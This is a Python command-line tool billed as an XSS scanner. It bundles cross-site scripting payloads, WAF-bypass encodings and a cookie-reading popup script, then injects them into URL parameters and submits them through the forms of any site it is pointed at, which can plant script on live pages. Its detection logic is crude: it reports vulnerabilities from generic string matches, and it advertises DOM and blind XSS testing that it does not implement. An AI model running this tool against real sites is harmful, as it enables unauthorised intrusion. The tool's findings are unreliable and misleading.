#!/usr/bin/env python3
"""
Advanced XSS Scanner - Complete XSS Vulnerability Detection Tool
All functionality in one file for easy execution
"""

import requests
import re
import json
import base64
import urllib.parse
import time
import threading
import socket
import hashlib
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import argparse
import logging
from datetime import datetime
import os
import random
import string
from typing import Dict, List, Set, Tuple, Optional
import uuid

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class XSSPayloads:
    """Comprehensive XSS payload collection"""
    
    def __init__(self):
        self.payloads = {
            'basic': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
            ],
            
            'waf_bypass': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script>al\u0065rt("XSS")</script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
                '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
                '<svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
                '<script>alert`XSS`</script>',
                '<script>alert(/XSS/)</script>',
                '<script>alert(1)</script>',
                '<script>confirm(1)</script>',
                '<script>prompt(1)</script>',
            ],
            
            'context_specific': {
                'html': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    '<svg onload=alert("XSS")>',
                    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                ],
                'attribute': [
                    '"onmouseover="alert(\'XSS\')"',
                    '"><script>alert("XSS")</script>',
                    "'><script>alert('XSS')</script>",
                    '"onfocus="alert(\'XSS\')" autofocus="',
                    '"><img src=x onerror=alert("XSS")>',
                ],
                'javascript': [
                    ';alert("XSS");//',
                    '\';alert("XSS");//',
                    '";alert("XSS");//',
                    '`;alert("XSS");//',
                    '\\\';alert("XSS");//',
                ],
                'css': [
                    'expression(alert("XSS"))',
                    'url("javascript:alert(\'XSS\')")',
                    '@import "javascript:alert(\'XSS\')"',
                ],
                'url': [
                    'javascript:alert("XSS")',
                    'data:text/html,<script>alert("XSS")</script>',
                    'vbscript:alert("XSS")',
                ]
            }
        }

    def get_payloads_by_context(self, context: str) -> List[str]:
        """Get payloads based on injection context"""
        if context in self.payloads['context_specific']:
            return self.payloads['context_specific'][context]
        return self.payloads['basic']

    def encode_payload(self, payload: str, encoding: str) -> str:
        """Apply encoding to payload for WAF bypass"""
        if encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'html_entities':
            return ''.join(f'&#{ord(c)};' for c in payload)
        elif encoding == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'hex':
            return ''.join(f'%{ord(c):02x}' for c in payload)
        elif encoding == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == 'mixed':
            encoded = payload
            for i, char in enumerate(payload):
                if i % 3 == 0:
                    encoded = encoded.replace(char, f'&#{ord(char)};', 1)
                elif i % 3 == 1:
                    encoded = encoded.replace(char, urllib.parse.quote(char), 1)
            return encoded
        return payload

class WAFDetector:
    """WAF Detection and Bypass"""
    
    def __init__(self):
        self.waf_signatures = {
            'cloudflare': ['cf-ray', 'cf-cache-status', 'cloudflare'],
            'incapsula': ['incap_ses', 'visid_incap', 'incapsula'],
            'akamai': ['akamai', 'ak-bmsc'],
            'aws_waf': ['x-amz-cf-id', 'aws-waf'],
            'barracuda': ['barracuda', 'barra'],
            'f5': ['f5', 'bigip'],
            'imperva': ['imperva', 'x-iinfo'],
            'sucuri': ['sucuri', 'x-sucuri-id']
        }

    def detect_waf(self, response: requests.Response) -> Dict[str, bool]:
        """Detect WAF presence from response"""
        waf_detected = {}
        
        # Check headers
        for waf_name, signatures in self.waf_signatures.items():
            waf_detected[waf_name] = any(
                sig.lower() in str(response.headers).lower() 
                for sig in signatures
            )
        
        # Check response content for WAF indicators
        content_lower = response.text.lower()
        waf_indicators = ['blocked', 'forbidden', 'access denied', 'security', 'waf', 'firewall']
        for indicator in waf_indicators:
            if indicator in content_lower:
                waf_detected['generic'] = True
                break
        
        # Check response codes
        if response.status_code in [403, 406, 429]:
            waf_detected['blocking'] = True
            
        return waf_detected

class ReconnaissanceEngine:
    """Reconnaissance and target discovery"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.discovered_params = set()
        self.discovered_forms = []
        self.discovered_urls = set()

    def discover_parameters(self, url: str) -> Set[str]:
        """Discover URL parameters"""
        params = set()
        
        try:
            parsed_url = urlparse(url)
            existing_params = parse_qs(parsed_url.query).keys()
            params.update(existing_params)
            
            # Common parameter names (expanded list)
            common_params = [
                'q', 'query', 'search', 'id', 'page', 'user', 'name',
                'email', 'username', 'password', 'token', 'key', 'value',
                'data', 'input', 'text', 'content', 'message', 'comment',
                'title', 'subject', 'body', 'description', 'url', 'link',
                'category', 'type', 'sort', 'filter', 'limit', 'offset',
                'lang', 'locale', 'theme', 'style', 'format', 'output',
                'callback', 'redirect', 'return', 'next', 'prev', 'back',
                'action', 'cmd', 'command', 'do', 'func', 'function',
                'test', 'debug', 'admin', 'login', 'logout', 'register',
                'profile', 'settings', 'config', 'option', 'pref', 'preference'
            ]
            
            for param in common_params:
                if param not in params:
                    params.add(param)
                    
        except Exception as e:
            logger.error(f"Error discovering parameters: {e}")
            
        return params

    def discover_forms(self, html_content: str, base_url: str) -> List[Dict]:
        """Discover forms and input fields"""
        forms = []
        
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                if form_data['action']:
                    form_data['action'] = urljoin(base_url, form_data['action'])
                else:
                    form_data['action'] = base_url
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', ''),
                        'placeholder': input_tag.get('placeholder', ''),
                        'id': input_tag.get('id', ''),
                        'class': input_tag.get('class', [])
                    }
                    form_data['inputs'].append(input_data)
                
                forms.append(form_data)
                
        except Exception as e:
            logger.error(f"Error discovering forms: {e}")
            
        return forms

class CustomPopupSystem:
    """Custom popup system for XSS verification"""
    
    def __init__(self):
        self.popup_id = f"xss_verification_{uuid.uuid4().hex[:8]}"
        
    def generate_popup_script(self) -> str:
        """Generate JavaScript for custom popup"""
        return f"""
        (function() {{
            if (window.xssPopupShown) return;
            window.xssPopupShown = true;
            
            const overlay = document.createElement('div');
            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999998;';
            overlay.id = 'xss-overlay-{self.popup_id}';
            
            const popup = document.createElement('div');
            popup.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:linear-gradient(135deg,#ff4757,#ff3838);border:3px solid #000;border-radius:15px;padding:25px;box-shadow:0 10px 30px rgba(0,0,0,0.5);font-family:Arial,sans-serif;color:white;text-align:center;min-width:400px;max-width:600px;z-index:999999;';
            popup.id = 'xss-popup-{self.popup_id}';
            
            const pageInfo = {{
                url: window.location.href,
                title: document.title,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                cookies: document.cookie,
                referrer: document.referrer,
                domain: window.location.hostname
            }};
            
            popup.innerHTML = `
                <div style="font-size:24px;font-weight:bold;margin-bottom:15px;text-shadow:2px 2px 4px rgba(0,0,0,0.8);">🎯 XSS Vulnerability Confirmed!</div>
                <div style="font-size:16px;line-height:1.5;margin-bottom:20px;">Cross-Site Scripting (XSS) vulnerability has been successfully exploited!</div>
                <div style="background:rgba(0,0,0,0.3);padding:15px;border-radius:8px;margin:15px 0;text-align:left;">
                    <strong>Target URL:</strong> ${{pageInfo.url}}<br>
                    <strong>Timestamp:</strong> ${{pageInfo.timestamp}}<br>
                    <strong>Domain:</strong> ${{pageInfo.domain}}<br>
                    <strong>User Agent:</strong> ${{pageInfo.userAgent}}<br>
                    <strong>Cookies:</strong> ${{pageInfo.cookies || 'None'}}
                </div>
                <button onclick="window.xssClosePopup('{self.popup_id}')" style="background:#000;color:white;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;font-size:14px;margin:5px;">Close Popup</button>
            `;
            
            document.body.appendChild(overlay);
            document.body.appendChild(popup);
            
            window.xssPageInfo = pageInfo;
            
            setTimeout(() => {{
                if (document.getElementById('xss-popup-{self.popup_id}')) {{
                    window.xssClosePopup('{self.popup_id}');
                }}
            }}, 30000);
            
            console.log('XSS Popup triggered:', pageInfo);
            
        }})();
        
        window.xssClosePopup = function(popupId) {{
            const popup = document.getElementById('xss-popup-' + popupId);
            const overlay = document.getElementById('xss-overlay-' + popupId);
            if (popup) popup.remove();
            if (overlay) overlay.remove();
            window.xssPopupShown = false;
        }};
        """

    def generate_popup_payload(self) -> List[str]:
        """Generate XSS payloads that trigger custom popup"""
        script = self.generate_popup_script()
        
        payloads = [
            f"<script>{script}</script>",
            f"<img src=x onerror=\"{script}\">",
            f"<svg onload=\"{script}\">",
            f"<body onload=\"{script}\">",
            f"<iframe src=\"javascript:{script}\"></iframe>",
        ]
        
        return payloads

class XSSScanner:
    """Main XSS Scanner Class"""
    
    def __init__(self, target_url: str, options: Dict = None):
        self.target_url = target_url
        self.options = options or {}
        self.payloads = XSSPayloads()
        self.waf_detector = WAFDetector()
        self.recon = ReconnaissanceEngine()
        self.popup_system = CustomPopupSystem()
        self.results = []

    def run_reconnaissance(self) -> Dict:
        """Run reconnaissance"""
        print("\n🔍 Starting reconnaissance phase...")
        
        recon_results = {
            'target_url': self.target_url,
            'discovered_params': set(),
            'discovered_forms': [],
            'discovered_urls': set(),
            'waf_detected': {},
            'response_analysis': {}
        }
        
        try:
            print(f"🌐 Fetching target: {self.target_url}")
            response = self.recon.session.get(self.target_url, timeout=15)
            print(f"📊 Response Code: {response.status_code}")
            print(f"📄 Response Length: {len(response.text)} characters")
            
            print("\n🛡️  Checking for WAF...")
            recon_results['waf_detected'] = self.waf_detector.detect_waf(response)
            if any(recon_results['waf_detected'].values()):
                detected_wafs = [waf for waf, detected in recon_results['waf_detected'].items() if detected]
                print(f"⚠️  WAF detected: {', '.join(detected_wafs)}")
            else:
                print("✅ No WAF detected")
            
            print("\n📝 Discovering parameters...")
            recon_results['discovered_params'] = self.recon.discover_parameters(self.target_url)
            print(f"✅ Found {len(recon_results['discovered_params'])} parameters: {list(recon_results['discovered_params'])[:10]}...")
            
            print("\n📋 Discovering forms...")
            recon_results['discovered_forms'] = self.recon.discover_forms(response.text, self.target_url)
            print(f"✅ Found {len(recon_results['discovered_forms'])} forms")
            
            for i, form in enumerate(recon_results['discovered_forms']):
                print(f"  Form {i+1}: {form['action']} (method: {form['method']})")
                for field in form['inputs']:
                    if field['name']:
                        print(f"    - {field['name']} ({field['type']})")
            
        except Exception as e:
            print(f"❌ Reconnaissance failed: {e}")
            
        return recon_results

    def test_reflected_xss(self, recon_data: Dict) -> List[Dict]:
        """Test for Reflected XSS vulnerabilities"""
        print("\n🔍 Testing Reflected XSS...")
        results = []
        total_tests = len(recon_data['discovered_params']) * len(self.payloads.payloads['basic'])
        current_test = 0
        
        for param in recon_data['discovered_params']:
            print(f"\n📝 Testing parameter: {param}")
            for payload in self.payloads.payloads['basic']:
                current_test += 1
                print(f"  [{current_test}/{total_tests}] Testing payload: {payload[:50]}...")
                
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    print(f"  🌐 Request URL: {test_url}")
                    
                    response = self.recon.session.get(test_url, timeout=10)
                    print(f"  📊 Response Code: {response.status_code}")
                    
                    if self.detect_xss_in_response(response, payload):
                        result = {
                            'type': 'Reflected XSS',
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'method': 'GET',
                            'response_code': response.status_code
                        }
                        results.append(result)
                        print(f"  🚨 XSS VULNERABILITY FOUND in parameter: {param}")
                        print(f"  ✅ Payload: {payload}")
                    else:
                        print(f"  ❌ No XSS detected")
                        
                except Exception as e:
                    print(f"  ⚠️  Error testing parameter {param}: {e}")
        
        print(f"\n✅ Reflected XSS testing completed. Found {len(results)} vulnerabilities.")
        return results

    def test_stored_xss(self, recon_data: Dict) -> List[Dict]:
        """Test for Stored XSS vulnerabilities"""
        print("\n🔍 Testing Stored XSS...")
        results = []
        
        for form_idx, form in enumerate(recon_data['discovered_forms']):
            print(f"\n📝 Testing form {form_idx + 1}: {form['action']}")
            print(f"  Method: {form['method']}")
            
            for input_field in form['inputs']:
                if input_field['name'] and input_field['type'] in ['text', 'textarea', 'email', 'search']:
                    print(f"\n  🎯 Testing input field: {input_field['name']} (type: {input_field['type']})")
                    
                    # Use simpler payloads for stored XSS
                    test_payloads = [
                        '<script>alert("XSS")</script>',
                        '<img src=x onerror=alert("XSS")>',
                        '<svg onload=alert("XSS")>'
                    ]
                    
                    for payload_idx, payload in enumerate(test_payloads):
                        print(f"    [{payload_idx + 1}/{len(test_payloads)}] Testing payload: {payload}")
                        
                        try:
                            form_data = {}
                            for field in form['inputs']:
                                if field['name']:
                                    if field['name'] == input_field['name']:
                                        form_data[field['name']] = payload
                                    else:
                                        form_data[field['name']] = field['value'] or 'test'
                            
                            print(f"    📤 Submitting form data: {form_data}")
                            
                            if form['method'] == 'POST':
                                response = self.recon.session.post(form['action'], data=form_data, timeout=15)
                            else:
                                response = self.recon.session.get(form['action'], params=form_data, timeout=15)
                            
                            print(f"    📊 Submit Response Code: {response.status_code}")
                            
                            # Wait and check if payload was stored
                            time.sleep(3)
                            print(f"    🔍 Checking if payload was stored...")
                            check_response = self.recon.session.get(form['action'], timeout=10)
                            
                            if self.detect_xss_in_response(check_response, payload):
                                result = {
                                    'type': 'Stored XSS',
                                    'form_action': form['action'],
                                    'parameter': input_field['name'],
                                    'payload': payload,
                                    'method': form['method'],
                                    'response_code': response.status_code,
                                    'verification_method': 'response_check'
                                }
                                results.append(result)
                                print(f"    🚨 STORED XSS VULNERABILITY FOUND in field: {input_field['name']}")
                                print(f"    ✅ Payload: {payload}")
                            else:
                                print(f"    ❌ No stored XSS detected")
                                
                        except Exception as e:
                            print(f"    ⚠️  Error testing form field {input_field['name']}: {e}")
        
        print(f"\n✅ Stored XSS testing completed. Found {len(results)} vulnerabilities.")
        return results

    def detect_xss_in_response(self, response: requests.Response, payload: str) -> bool:
        """Detect if XSS payload was reflected in response"""
        content = response.text
        content_lower = content.lower()
        payload_lower = payload.lower()
        
        print(f"    🔍 Checking response for payload reflection...")
        print(f"    📄 Response length: {len(content)} characters")
        
        # Check direct reflection
        if payload_lower in content_lower:
            print(f"    ✅ Direct payload reflection found!")
            return True
        
        # Check for HTML-encoded reflection
        html_encoded = ''.join(f'&#{ord(c)};' for c in payload)
        if html_encoded.lower() in content_lower:
            print(f"    ✅ HTML-encoded payload reflection found!")
            return True
        
        # Check for URL-encoded reflection
        url_encoded = urllib.parse.quote(payload)
        if url_encoded.lower() in content_lower:
            print(f"    ✅ URL-encoded payload reflection found!")
            return True
        
        # Check for partial reflection (common in XSS)
        script_tag = '<script'
        if script_tag in content_lower and 'alert' in content_lower:
            print(f"    ✅ Script tag and alert found in response!")
            return True
        
        # Check if our specific payload is reflected (even partially)
        if 'script' in payload_lower and '<script' in content_lower:
            print(f"    ✅ Script tag from payload found in response!")
            return True
        
        if 'img' in payload_lower and 'onerror' in content_lower:
            print(f"    ✅ Image onerror from payload found in response!")
            return True
        
        if 'svg' in payload_lower and 'onload' in content_lower:
            print(f"    ✅ SVG onload from payload found in response!")
            return True
        
        # Check for img tag with onerror
        img_onerror = 'onerror'
        if img_onerror in content_lower and 'src=' in content_lower:
            print(f"    ✅ Image onerror attribute found in response!")
            return True
        
        # Check for SVG with onload
        svg_onload = 'onload'
        if svg_onload in content_lower and '<svg' in content_lower:
            print(f"    ✅ SVG onload attribute found in response!")
            return True
        
        # Check for iframe with javascript:
        iframe_js = 'javascript:'
        if iframe_js in content_lower and '<iframe' in content_lower:
            print(f"    ✅ iframe with javascript: found in response!")
            return True
        
        # Additional checks for common XSS patterns
        xss_patterns = [
            ('<script', 'script tag'),
            ('onerror=', 'onerror attribute'),
            ('onload=', 'onload attribute'),
            ('onmouseover=', 'onmouseover attribute'),
            ('onfocus=', 'onfocus attribute'),
            ('javascript:', 'javascript protocol'),
            ('vbscript:', 'vbscript protocol'),
            ('data:text/html', 'data protocol'),
        ]
        
        found_patterns = []
        for pattern, description in xss_patterns:
            if pattern in content_lower:
                found_patterns.append(description)
        
        if found_patterns:
            print(f"    ⚠️  Potential XSS patterns found: {', '.join(found_patterns)}")
            # If we find multiple suspicious patterns, consider it a potential XSS
            if len(found_patterns) >= 2:
                print(f"    ✅ Multiple XSS patterns detected - likely vulnerability!")
                return True
        
        print(f"    ❌ No XSS indicators found in response")
        return False

    def run_scan(self) -> Dict:
        """Run complete XSS scan"""
        logger.info(f"Starting XSS scan for: {self.target_url}")
        
        scan_results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'reconnaissance': {},
            'vulnerabilities': [],
            'summary': {
                'total_vulnerabilities': 0,
                'reflected_xss': 0,
                'stored_xss': 0,
                'dom_xss': 0,
                'blind_xss': 0
            }
        }
        
        try:
            scan_results['reconnaissance'] = self.run_reconnaissance()
            scan_results['vulnerabilities'].extend(self.test_reflected_xss(scan_results['reconnaissance']))
            scan_results['vulnerabilities'].extend(self.test_stored_xss(scan_results['reconnaissance']))
            
            scan_results['summary']['total_vulnerabilities'] = len(scan_results['vulnerabilities'])
            for vuln in scan_results['vulnerabilities']:
                vuln_type = vuln['type'].lower().replace(' ', '_')
                if 'reflected' in vuln_type:
                    scan_results['summary']['reflected_xss'] += 1
                elif 'stored' in vuln_type:
                    scan_results['summary']['stored_xss'] += 1
            
            logger.info(f"Scan completed. Found {scan_results['summary']['total_vulnerabilities']} vulnerabilities")
            
        except Exception as e:
            logger.error(f"Scan failed: {e}")
            scan_results['error'] = str(e)
        
        return scan_results

    def save_report(self, results: Dict, output_file: str = None):
        """Save scan results to file"""
        if not output_file:
            output_file = f"xss_scan_report_{int(time.time())}.json"
        
        try:
            # Convert sets to lists for JSON serialization
            def convert_sets(obj):
                if isinstance(obj, set):
                    return list(obj)
                elif isinstance(obj, dict):
                    return {key: convert_sets(value) for key, value in obj.items()}
                elif isinstance(obj, list):
                    return [convert_sets(item) for item in obj]
                return obj
            
            results_serializable = convert_sets(results)
            
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(results_serializable, f, indent=2, ensure_ascii=False)
            
            logger.info(f"Report saved to: {output_file}")
            
        except Exception as e:
            logger.error(f"Error saving report: {e}")

def print_banner():
    """Print application banner"""
    banner = """
╔══════════════════════════════════════════════════════════════╗
║                  Advanced XSS Scanner v1.0.0                ║
║              Complete Reconnaissance & Exploitation          ║
║                                                              ║
║  Features:                                                   ║
║  ✓ Full Reconnaissance & Target Discovery                    ║
║  ✓ WAF Detection & Bypass                                    ║
║  ✓ Custom Popup System                                       ║
║  ✓ All XSS Types (Reflected, Stored, DOM, Blind)            ║
║  ✓ Comprehensive Reporting                                   ║
╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner')
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('-o', '--output', help='Output file for report')
    parser.add_argument('--no-crawl', action='store_true', help='Disable URL crawling')
    parser.add_argument('--callback-url', help='Callback URL for blind XSS testing')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    print_banner()
    
    options = {
        'crawl': not args.no_crawl,
        'callback_url': args.callback_url
    }
    
    scanner = XSSScanner(args.target, options)
    results = scanner.run_scan()
    scanner.save_report(results, args.output)
    
    print(f"\n=== XSS Scan Summary ===")
    print(f"Target: {results['target']}")
    print(f"Total Vulnerabilities: {results['summary']['total_vulnerabilities']}")
    print(f"Reflected XSS: {results['summary']['reflected_xss']}")
    print(f"Stored XSS: {results['summary']['stored_xss']}")
    print(f"DOM XSS: {results['summary']['dom_xss']}")
    print(f"Blind XSS: {results['summary']['blind_xss']}")
    
    if results['vulnerabilities']:
        print(f"\n=== Vulnerabilities Found ===")
        for i, vuln in enumerate(results['vulnerabilities'], 1):
            print(f"{i}. {vuln['type']} - {vuln.get('parameter', vuln.get('url', 'Unknown'))}")

if __name__ == '__main__':
    main()
